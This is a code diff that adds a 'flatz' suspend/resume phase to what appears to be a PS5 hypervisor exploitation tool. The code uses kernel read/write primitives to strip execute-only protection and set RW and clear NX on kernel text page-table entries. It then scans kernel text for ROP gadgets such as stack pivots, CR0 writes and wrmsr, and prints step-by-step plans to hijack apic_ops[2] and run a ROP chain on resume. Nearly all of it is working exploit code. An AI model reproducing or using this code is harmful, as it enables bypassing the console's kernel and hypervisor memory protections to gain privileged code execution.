@@ -4528,6 +4528,506 @@ idt_skip: ;
     notify("[HV Research] Kmod kldload campaign complete!");
 }
 
+/* ─── Phase 6: Flatz suspend/resume setup ─── */
+/*
+ * This campaign implements two phases of the flatz method:
+ *
+ * Phase 6a: Clear XOTEXT bit (Sony bit 58) and set RW on all ktext
+ *           guest page table entries.  This prepares for suspend/resume:
+ *           when the HV reinitializes after resume, it reads these PTEs
+ *           and won't apply execute-only protection in the NPT.
+ *
+ * Phase 6b: Test whether ktext is readable via DMAP.  On first run
+ *           (before suspend), this will FAIL (XOM still enforced by NPT).
+ *           After suspend/resume (second run), this should SUCCEED,
+ *           allowing us to scan ktext for ROP gadgets.
+ *
+ * The user must manually enter rest mode between runs:
+ *   Run 1: hv_research.elf → clears XOTEXT → "enter rest mode now"
+ *   Run 2: hv_research.elf → ktext readable → gadget scan
+ */
+
+/* PTE bit definitions for PS5 (AMD64 + Sony extensions) */
+#define PTE_BIT_RW          (1ULL << 1)
+#define PTE_BIT_XOTEXT      (1ULL << 58)   /* Sony: execute-only text */
+#define PTE_BIT_NX          (1ULL << 63)
+
+/* Gadget patterns to search for in ktext */
+struct gadget_pattern {
+    const char *name;
+    const uint8_t *bytes;
+    int len;
+    int useful;     /* 1 = immediately useful, 0 = informational */
+};
+
+static void campaign_flatz_setup(void) {
+    printf("\n=============================================\n");
+    printf("  Phase 6: Flatz Suspend/Resume Setup\n");
+    printf("=============================================\n\n");
+
+    if (!g_dmap_base || !g_cr3_phys || !g_ktext_base) {
+        printf("[-] Missing prerequisites (DMAP=0x%lx, CR3=0x%lx, ktext=0x%lx)\n",
+               (unsigned long)g_dmap_base, (unsigned long)g_cr3_phys,
+               (unsigned long)g_ktext_base);
+        return;
+    }
+
+    /* ─── Phase 6a: Clear XOTEXT on ktext guest PTEs ─── */
+    printf("[*] Phase 6a: Clearing XOTEXT on ktext guest page table entries\n");
+    printf("    ktext base: 0x%lx\n", (unsigned long)g_ktext_base);
+    fflush(stdout);
+
+    /*
+     * Scan range: 32MB from ktext_base (matches Phase 3 ktext_size).
+     * This covers all kernel .text including late LAPIC functions.
+     */
+    uint64_t ktext_scan_size = 0x2000000;  /* 32MB */
+    uint64_t ktext_end = g_ktext_base + ktext_scan_size;
+
+    int pte_modified = 0;
+    int pde_modified = 0;
+    int huge_pages = 0;
+    int giant_pages = 0;
+    int unmapped = 0;
+
+    /*
+     * Walk page tables for each 4KB page in ktext range.
+     * For 2MB huge pages, modify the PDE and advance by 2MB.
+     * For 1GB giant pages, modify the PDPE and advance by 1GB.
+     */
+    for (uint64_t va = g_ktext_base; va < ktext_end && va >= g_ktext_base; ) {
+        uint64_t pml4_idx = (va >> 39) & 0x1FF;
+        uint64_t pdp_idx  = (va >> 30) & 0x1FF;
+        uint64_t pd_idx   = (va >> 21) & 0x1FF;
+        uint64_t pt_idx   = (va >> 12) & 0x1FF;
+
+        /* PML4E */
+        uint64_t pml4e;
+        kernel_copyout(g_dmap_base + g_cr3_phys + pml4_idx * 8, &pml4e, 8);
+        if (!(pml4e & PTE_PRESENT)) {
+            unmapped++;
+            va += 0x1000;
+            continue;
+        }
+
+        /* PDPE */
+        uint64_t pdpe_pa = (pml4e & PTE_PA_MASK) + pdp_idx * 8;
+        uint64_t pdpe;
+        kernel_copyout(g_dmap_base + pdpe_pa, &pdpe, 8);
+        if (!(pdpe & PTE_PRESENT)) {
+            unmapped++;
+            va += 0x1000;
+            continue;
+        }
+        if (pdpe & PTE_PS) {
+            /* 1GB giant page - modify PDPE */
+            if (pdpe & PTE_BIT_XOTEXT) {
+                pdpe &= ~PTE_BIT_XOTEXT;
+                pdpe |= PTE_BIT_RW;
+                pdpe &= ~PTE_BIT_NX;
+                kernel_copyin(&pdpe, g_dmap_base + pdpe_pa, 8);
+                giant_pages++;
+            }
+            va = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
+            continue;
+        }
+
+        /* PDE */
+        uint64_t pde_pa = (pdpe & PTE_PA_MASK) + pd_idx * 8;
+        uint64_t pde;
+        kernel_copyout(g_dmap_base + pde_pa, &pde, 8);
+        if (!(pde & PTE_PRESENT)) {
+            unmapped++;
+            va += 0x1000;
+            continue;
+        }
+        if (pde & PTE_PS) {
+            /* 2MB huge page - modify PDE */
+            if (pde & PTE_BIT_XOTEXT) {
+                pde &= ~PTE_BIT_XOTEXT;
+                pde |= PTE_BIT_RW;
+                pde &= ~PTE_BIT_NX;
+                kernel_copyin(&pde, g_dmap_base + pde_pa, 8);
+                pde_modified++;
+                huge_pages++;
+            }
+            va = (va + (1ULL << 21)) & ~((1ULL << 21) - 1);
+            continue;
+        }
+
+        /* PTE (4KB page) */
+        uint64_t pte_pa = (pde & PTE_PA_MASK) + pt_idx * 8;
+        uint64_t pte;
+        kernel_copyout(g_dmap_base + pte_pa, &pte, 8);
+        if (!(pte & PTE_PRESENT)) {
+            unmapped++;
+            va += 0x1000;
+            continue;
+        }
+
+        if (pte & PTE_BIT_XOTEXT) {
+            pte &= ~PTE_BIT_XOTEXT;
+            pte |= PTE_BIT_RW;
+            pte &= ~PTE_BIT_NX;
+            kernel_copyin(&pte, g_dmap_base + pte_pa, 8);
+            pte_modified++;
+        }
+        va += 0x1000;
+    }
+
+    printf("[+] XOTEXT clearing complete:\n");
+    printf("    PDEs modified (2MB pages): %d\n", pde_modified);
+    printf("    PTEs modified (4KB pages): %d\n", pte_modified);
+    printf("    Giant pages (1GB):         %d\n", giant_pages);
+    printf("    Huge pages (2MB):          %d\n", huge_pages);
+    printf("    Unmapped pages skipped:    %d\n", unmapped);
+    printf("    Total modified: %d\n", pde_modified + pte_modified + giant_pages);
+    fflush(stdout);
+
+    /* ─── Phase 6b: Test ktext readability + gadget scan ─── */
+    printf("\n[*] Phase 6b: Testing ktext readability via DMAP...\n");
+
+    uint64_t ktext_pa = va_to_pa_quiet(g_ktext_base);
+    if (ktext_pa == 0) {
+        printf("[-] Cannot resolve ktext PA — page table walk failed\n");
+        return;
+    }
+
+    /*
+     * Try reading the first 16 bytes of ktext through DMAP.
+     * If ktext is still XOM (first run, NPT not updated yet), this
+     * will return garbage/zeros or fail.  After suspend/resume,
+     * the HV reinitializes NPT without XOM, and this succeeds.
+     */
+    uint8_t ktext_probe[16];
+    memset(ktext_probe, 0xCC, sizeof(ktext_probe));
+    int read_ok = kernel_copyout(g_dmap_base + ktext_pa, ktext_probe, 16);
+
+    /*
+     * Heuristic: ktext starts with ELF header or code.  If the read
+     * succeeds AND the bytes are not all zero or all 0xCC (our fill),
+     * ktext is actually readable.
+     */
+    int all_zero = 1, all_cc = 1;
+    for (int i = 0; i < 16; i++) {
+        if (ktext_probe[i] != 0x00) all_zero = 0;
+        if (ktext_probe[i] != 0xCC) all_cc = 0;
+    }
+    int ktext_readable = (read_ok == 0 && !all_zero && !all_cc);
+
+    printf("[*] ktext DMAP read: ret=%d, bytes: ", read_ok);
+    for (int i = 0; i < 16; i++) printf("%02x ", ktext_probe[i]);
+    printf("\n");
+
+    if (!ktext_readable) {
+        printf("\n[!] ktext is still EXECUTE-ONLY (NPT enforced)\n");
+        printf("[!] XOTEXT cleared in guest PTEs, but NPT not yet updated.\n");
+        printf("[!] To continue the flatz method:\n");
+        printf("    1. Put PS5 in REST MODE (Settings > Power > Rest Mode)\n");
+        printf("    2. Wake PS5 from rest mode\n");
+        printf("    3. Re-run exploit + hv_research.elf\n");
+        printf("    4. Phase 6b will detect readable ktext and scan for gadgets\n");
+        printf("\n");
+        notify("[HV Research] XOTEXT cleared! Enter REST MODE, then re-run.");
+        fflush(stdout);
+        return;
+    }
+
+    /* ── ktext IS readable — we're in post-resume state! ── */
+    printf("\n[+] *** ktext IS READABLE via DMAP! ***\n");
+    printf("[+] HV reinitialized without XOM — Byepervisor method WORKS on FW 4.03!\n\n");
+    notify("[HV Research] ktext readable! Scanning for gadgets...");
+    fflush(stdout);
+
+    /* ─── Gadget scan ─── */
+    printf("[*] Scanning ktext for ROP gadgets...\n");
+    printf("    Scan range: 0x%lx — 0x%lx (%luMB)\n",
+           (unsigned long)g_ktext_base,
+           (unsigned long)ktext_end,
+           (unsigned long)(ktext_scan_size >> 20));
+    fflush(stdout);
+
+    /*
+     * Gadget patterns we're looking for:
+     * These are useful for the apic_ops xapic_mode hook, where
+     * xapic_mode is void(*)(void) — no args, no meaningful
+     * register state on entry (all caller-saved regs are scratch).
+     */
+    static const uint8_t pat_ret[]           = { 0xC3 };
+    static const uint8_t pat_xchg_rsp_rax[]  = { 0x48, 0x94, 0xC3 };
+    static const uint8_t pat_mov_cr0_rax[]   = { 0x0F, 0x22, 0xC0 };
+    static const uint8_t pat_mov_rax_cr0[]   = { 0x0F, 0x20, 0xC0 };
+    static const uint8_t pat_wrmsr[]         = { 0x0F, 0x30 };
+    static const uint8_t pat_rdmsr[]         = { 0x0F, 0x32 };
+    static const uint8_t pat_pop_rdi_ret[]   = { 0x5F, 0xC3 };
+    static const uint8_t pat_pop_rsi_ret[]   = { 0x5E, 0xC3 };
+    static const uint8_t pat_pop_rdx_ret[]   = { 0x5A, 0xC3 };
+    static const uint8_t pat_pop_rcx_ret[]   = { 0x59, 0xC3 };
+    static const uint8_t pat_pop_rax_ret[]   = { 0x58, 0xC3 };
+    static const uint8_t pat_pop_rsp_ret[]   = { 0x5C, 0xC3 };
+    static const uint8_t pat_mov_rsp_rax[]   = { 0x48, 0x89, 0xC4, 0xC3 };
+    /* mov [rdi], rax; ret — write gadget (useful if rdi is controlled) */
+    static const uint8_t pat_mov_rdi_rax[]   = { 0x48, 0x89, 0x07, 0xC3 };
+    /* xor eax, eax; ret — returns 0, safe NOP-like gadget */
+    static const uint8_t pat_xor_eax_ret[]   = { 0x31, 0xC0, 0xC3 };
+    /* push rbp; mov rbp, rsp — function prologue (CFI valid target) */
+    static const uint8_t pat_prologue[]      = { 0x55, 0x48, 0x89, 0xE5 };
+    /* wrmsr; ... ret (wrmsr followed by ret within 4 bytes) */
+    static const uint8_t pat_wrmsr_ret[]     = { 0x0F, 0x30, 0xC3 };
+    /* cli; ret (disable interrupts) */
+    static const uint8_t pat_cli_ret[]       = { 0xFA, 0xC3 };
+    /* sti; ret (enable interrupts) */
+    static const uint8_t pat_sti_ret[]       = { 0xFB, 0xC3 };
+
+    struct gadget_pattern gadgets[] = {
+        { "ret",                  pat_ret,          1, 0 },
+        { "pop rdi; ret",        pat_pop_rdi_ret,  2, 1 },
+        { "pop rsi; ret",        pat_pop_rsi_ret,  2, 1 },
+        { "pop rdx; ret",        pat_pop_rdx_ret,  2, 1 },
+        { "pop rcx; ret",        pat_pop_rcx_ret,  2, 1 },
+        { "pop rax; ret",        pat_pop_rax_ret,  2, 1 },
+        { "pop rsp; ret",        pat_pop_rsp_ret,  2, 1 },
+        { "xchg rsp, rax; ret",  pat_xchg_rsp_rax, 3, 1 },
+        { "mov rsp, rax; ret",   pat_mov_rsp_rax,  4, 1 },
+        { "xor eax, eax; ret",   pat_xor_eax_ret,  3, 1 },
+        { "mov cr0, rax",        pat_mov_cr0_rax,  3, 1 },
+        { "mov rax, cr0",        pat_mov_rax_cr0,  3, 1 },
+        { "wrmsr; ret",          pat_wrmsr_ret,    3, 1 },
+        { "wrmsr",               pat_wrmsr,        2, 0 },
+        { "rdmsr",               pat_rdmsr,        2, 0 },
+        { "mov [rdi], rax; ret", pat_mov_rdi_rax,  4, 1 },
+        { "cli; ret",            pat_cli_ret,      2, 1 },
+        { "sti; ret",            pat_sti_ret,      2, 1 },
+        { "push rbp; mov rbp, rsp (prologue)", pat_prologue, 4, 0 },
+    };
+    int n_gadgets = sizeof(gadgets) / sizeof(gadgets[0]);
+
+    /* Track first 8 hits per gadget type */
+    #define MAX_HITS_PER_GADGET 8
+    struct {
+        uint64_t addrs[MAX_HITS_PER_GADGET];
+        int count;
+    } hits[sizeof(gadgets) / sizeof(gadgets[0])];
+    memset(hits, 0, sizeof(hits));
+
+    /* Count some special gadgets */
+    int total_ret = 0;
+    int total_wrmsr = 0;
+    int total_prologues = 0;
+
+    /*
+     * Scan ktext 4KB at a time via DMAP.
+     * For each chunk, search for all gadget patterns.
+     */
+    uint8_t chunk[0x1000];
+    uint64_t chunks_read = 0;
+    uint64_t chunks_failed = 0;
+
+    for (uint64_t off = 0; off < ktext_scan_size; off += 0x1000) {
+        uint64_t page_va = g_ktext_base + off;
+        uint64_t page_pa = va_to_pa_quiet(page_va);
+        if (page_pa == 0 || page_pa >= MAX_SAFE_PA) {
+            chunks_failed++;
+            continue;
+        }
+
+        int ret = kernel_copyout(g_dmap_base + page_pa, chunk, 0x1000);
+        if (ret != 0) {
+            chunks_failed++;
+            continue;
+        }
+        chunks_read++;
+
+        /* Search this chunk for all patterns */
+        for (int g = 0; g < n_gadgets; g++) {
+            int plen = gadgets[g].len;
+            for (int bi = 0; bi <= 0x1000 - plen; bi++) {
+                if (memcmp(&chunk[bi], gadgets[g].bytes, plen) == 0) {
+                    uint64_t gadget_kva = page_va + bi;
+
+                    /* Track counts for common gadgets */
+                    if (g == 0) total_ret++;
+                    else if (g == 13) total_wrmsr++;
+                    else if (g == 18) total_prologues++;
+
+                    /* Store first N hits */
+                    if (hits[g].count < MAX_HITS_PER_GADGET) {
+                        hits[g].addrs[hits[g].count] = gadget_kva;
+                    }
+                    hits[g].count++;
+                }
+            }
+        }
+
+        /* Progress every 4MB */
+        if ((off & 0x3FFFFF) == 0 && off > 0) {
+            printf("    ... scanned %luMB / %luMB\n",
+                   (unsigned long)(off >> 20),
+                   (unsigned long)(ktext_scan_size >> 20));
+            fflush(stdout);
+        }
+    }
+
+    printf("[+] Scan complete: %lu chunks read, %lu failed\n\n",
+           (unsigned long)chunks_read, (unsigned long)chunks_failed);
+
+    /* ─── Report all found gadgets ─── */
+    printf("=== ROP Gadget Scan Results ===\n\n");
+
+    printf("Summary counts:\n");
+    printf("    ret instructions:     %d\n", total_ret);
+    printf("    wrmsr instructions:   %d\n", total_wrmsr);
+    printf("    function prologues:   %d\n\n", total_prologues);
+
+    printf("Useful gadgets found:\n");
+    printf("%-30s  %6s  %-20s  %s\n",
+           "Gadget", "Count", "First Address", "ktext+offset");
+    printf("─────────────────────────────────────────────"
+           "─────────────────────────────────\n");
+
+    for (int g = 0; g < n_gadgets; g++) {
+        if (hits[g].count == 0) continue;
+
+        /* Highlight useful gadgets */
+        const char *marker = gadgets[g].useful ? "[*]" : "   ";
+
+        printf("%s %-27s  %6d",
+               marker, gadgets[g].name, hits[g].count);
+
+        if (hits[g].count > 0) {
+            printf("  0x%016lx  ktext+0x%lx",
+                   (unsigned long)hits[g].addrs[0],
+                   (unsigned long)(hits[g].addrs[0] - g_ktext_base));
+        }
+        printf("\n");
+
+        /* Print additional hits for useful gadgets */
+        if (gadgets[g].useful) {
+            int show = hits[g].count < MAX_HITS_PER_GADGET ?
+                       hits[g].count : MAX_HITS_PER_GADGET;
+            for (int h = 1; h < show; h++) {
+                printf("    %36s0x%016lx  ktext+0x%lx\n",
+                       "",
+                       (unsigned long)hits[g].addrs[h],
+                       (unsigned long)(hits[g].addrs[h] - g_ktext_base));
+            }
+            if (hits[g].count > MAX_HITS_PER_GADGET) {
+                printf("    %36s... and %d more\n",
+                       "", hits[g].count - MAX_HITS_PER_GADGET);
+            }
+        }
+    }
+
+    /* ─── Identify best gadgets for the flatz exploit chain ─── */
+    printf("\n=== Recommended Gadgets for Flatz Method ===\n\n");
+
+    /*
+     * For the apic_ops xapic_mode hook:
+     *   - xapic_mode is void(*)(void): no args, all regs are scratch
+     *   - Called from cpususpend_handler during resume
+     *   - Stack has return address to cpususpend_handler
+     *
+     * Strategy 1: "Safe NOP" — write a ret gadget to prove the hook fires
+     *   apic_ops[2] = &ret → function returns immediately → system resumes
+     *
+     * Strategy 2: Stack pivot → full ROP chain
+     *   Requires: "pop rsp; ret" or "xchg rsp, rax; ret"
+     *   Place ROP chain at known DMAP address, pivot to it
+     *
+     * Strategy 3: Direct action
+     *   "mov cr0, rax; ret" — if RAX has WP cleared, disables write protect
+     *   "wrmsr; ret" — if ECX/EAX/EDX are set up, writes arbitrary MSR
+     */
+
+    /* Strategy 1: Safe ret */
+    if (hits[0].count > 0) {
+        printf("[STRATEGY 1] Safe ret (prove hook fires without crashing):\n");
+        printf("    Gadget: ret at 0x%lx (ktext+0x%lx)\n",
+               (unsigned long)hits[0].addrs[0],
+               (unsigned long)(hits[0].addrs[0] - g_ktext_base));
+        printf("    Write this to apic_ops[2], trigger suspend/resume.\n");
+        printf("    If system resumes normally → hook FIRED.\n");
+        printf("    (xapic_mode was replaced with ret, LAPIC not reinitialized,\n");
+        printf("     but system should still work for basic testing)\n\n");
+    }
+
+    /* Strategy 2: Stack pivot */
+    int pivot_idx = -1;
+    /* Prefer pop rsp; ret (index 6) */
+    if (hits[6].count > 0) pivot_idx = 6;
+    /* Fallback: xchg rsp, rax; ret (index 7) */
+    else if (hits[7].count > 0) pivot_idx = 7;
+    /* Fallback: mov rsp, rax; ret (index 8) */
+    else if (hits[8].count > 0) pivot_idx = 8;
+
+    if (pivot_idx >= 0) {
+        printf("[STRATEGY 2] Stack pivot (full ROP chain):\n");
+        printf("    Gadget: %s at 0x%lx (ktext+0x%lx)\n",
+               gadgets[pivot_idx].name,
+               (unsigned long)hits[pivot_idx].addrs[0],
+               (unsigned long)(hits[pivot_idx].addrs[0] - g_ktext_base));
+        printf("    Place ROP chain in kernel memory (via DMAP write)\n");
+        printf("    Set apic_ops[2] = this gadget address\n");
+        printf("    On resume: pivots stack → ROP chain executes\n\n");
+    } else {
+        printf("[STRATEGY 2] Stack pivot: NO suitable gadget found.\n\n");
+    }
+
+    /* Strategy 3: Direct CR0 control */
+    if (hits[10].count > 0 && hits[11].count > 0) {
+        printf("[STRATEGY 3] Direct CR0 manipulation:\n");
+        printf("    Read:  mov rax, cr0 at 0x%lx\n",
+               (unsigned long)hits[11].addrs[0]);
+        printf("    Write: mov cr0, rax at 0x%lx\n",
+               (unsigned long)hits[10].addrs[0]);
+        printf("    Combined with pop rax; ret to control RAX value.\n\n");
+    }
+
+    /* ROP chain building blocks */
+    printf("=== ROP Chain Building Blocks ===\n");
+    printf("    pop rdi; ret:  %s\n",
+           hits[1].count > 0 ?
+           "FOUND" : "NOT FOUND");
+    printf("    pop rsi; ret:  %s\n",
+           hits[2].count > 0 ?
+           "FOUND" : "NOT FOUND");
+    printf("    pop rdx; ret:  %s\n",
+           hits[3].count > 0 ?
+           "FOUND" : "NOT FOUND");
+    printf("    pop rcx; ret:  %s\n",
+           hits[4].count > 0 ?
+           "FOUND" : "NOT FOUND");
+    printf("    pop rax; ret:  %s\n",
+           hits[5].count > 0 ?
+           "FOUND" : "NOT FOUND");
+    printf("    wrmsr; ret:    %s\n",
+           hits[12].count > 0 ?
+           "FOUND" : "NOT FOUND");
+    printf("    mov cr0, rax:  %s\n",
+           hits[10].count > 0 ?
+           "FOUND" : "NOT FOUND");
+
+    int rop_ready = (hits[1].count > 0) && (hits[5].count > 0) &&
+                    (hits[0].count > 0);
+    printf("\n[%c] Sufficient gadgets for basic ROP chain: %s\n",
+           rop_ready ? '+' : '-',
+           rop_ready ? "YES" : "NO");
+
+    if (rop_ready) {
+        printf("\n[+] ============================================\n");
+        printf("[+]  GADGETS FOUND — READY FOR APIC_OPS HOOK\n");
+        printf("[+] ============================================\n");
+        printf("[+] Next steps:\n");
+        printf("[+]   1. Write 'ret' gadget to apic_ops[2] to prove hook fires\n");
+        printf("[+]   2. Build full ROP chain for real exploit\n");
+        printf("[+]   3. Write stack pivot to apic_ops[2]\n");
+        printf("[+]   4. Trigger suspend/resume → ROP chain executes\n");
+    }
+
+    printf("\n");
+    fflush(stdout);
+}
+
 /* ─── Main entry point ─── */
 
 int main(void) {
@@ -4586,6 +5086,11 @@ int main(void) {
 
     /* Campaign 7: Kernel module via kldload (highest priority) */
     campaign_kmod_kldload();
+
+    /* Phase 6: Flatz suspend/resume setup (XOTEXT clear + gadget scan) */
+    if (g_dmap_base) {
+        campaign_flatz_setup();
+    }
 
     if (g_dmap_base) {
         campaign_iommu_recon();
